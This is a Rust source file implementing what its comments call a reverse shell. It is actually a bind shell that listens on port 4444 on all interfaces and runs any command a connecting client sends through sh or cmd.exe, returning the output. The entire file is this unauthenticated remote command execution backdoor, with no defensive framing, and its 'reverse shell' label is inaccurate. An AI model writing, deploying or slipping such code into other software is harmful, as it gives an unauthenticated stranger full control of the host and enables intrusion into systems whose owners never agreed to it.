use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::process::{Command, Stdio};
use std::path::PathBuf;
use std::env;
use std::io;

pub struct Client {
    handle: TcpStream,
    input_buf: [u8; 1024],
    current_dir: PathBuf,  // Track the current directory
}

impl Client {
    pub fn new(listener: &TcpListener) -> Result<Self, io::Error> {
        let (stream, _) = listener.accept()?;  // Handle the result of `accept()`
        Ok(Self {
            handle: stream,
            input_buf: [0; 1024],
            current_dir: env::current_dir()?,  // Start in the current directory
        })
    }

    pub fn read(&mut self) -> Result<String, io::Error> {
        // Read into the buffer
        let bytes_read = self.handle.read(&mut self.input_buf)?;

        // Convert the buffer to a string, making sure to handle null bytes properly
        let s = match std::str::from_utf8(&self.input_buf[..bytes_read]) {
            Ok(valid_str) => valid_str.trim(),  // Safely trim and ignore any leading/trailing whitespace
            Err(_) => return Err(io::Error::new(io::ErrorKind::InvalidData, "Invalid UTF-8")),
        };

        // Clear the buffer after creating the string reference
        let result = s.to_string();
        self.input_buf.fill(0);

        Ok(result)
    }

    pub fn write(&mut self, s: String) -> Result<(), io::Error> {
        // Write the string to the handle (TcpStream)
        self.handle.write_all(s.as_bytes())?;
        Ok(())
    }

    // Update the current working directory
    pub fn change_directory(&mut self, dir: String) -> Result<(), io::Error> {
        let new_dir = self.current_dir.join(dir);
        if new_dir.exists() && new_dir.is_dir() {
            self.current_dir = new_dir;
            Ok(())
        } else {
            Err(io::Error::new(io::ErrorKind::NotFound, "Directory not found"))
        }
    }
}

pub fn start_reverse_shell() -> Result<(), io::Error> {
    // Start listening for incoming connections (e.g., reverse shell)
    let listener = TcpListener::bind("0.0.0.0:4444")?;
    println!("Listening for reverse shell connection on port 4444...");

    let mut client = Client::new(&listener)?;

    println!("Client connected.");

    // Detect the operating system (for now, let's assume we're on Windows or Unix)
    let is_windows = std::env::consts::OS == "windows";

    loop {
        let input = client.read()?;

        if input.trim().is_empty() {
            break;
        }

        // Check if the command is `cd <dir>`
        if input.starts_with("cd ") {
            let dir = input[3..].trim().to_string();
            if let Err(e) = client.change_directory(dir) {
                client.write(format!("Error: {}", e))?;
            } else {
                client.write(format!("Changed directory to: {}", client.current_dir.display()))?;
            }
        } else {
            // For all other commands, run them in the current directory
            let mut command = if is_windows {
                Command::new("cmd.exe")
                    .args(&["/c", &input])  // "/c" is for executing the command
                    .current_dir(&client.current_dir)
                    .output()?
            } else {
                Command::new("sh")
                    .arg("-c")
                    .arg(&input)  // Linux/Unix uses sh to execute commands
                    .current_dir(&client.current_dir)
                    .output()?
            };

            if !command.status.success() {
                client.write("Command execution failed.".to_string())?;
            } else {
                let result = String::from_utf8_lossy(&command.stdout);
                client.write(result.to_string())?;
            }
        }
    }

    Ok(())
}

fn main() -> Result<(), io::Error> {
    // Start the reverse shell server
    start_reverse_shell()
}
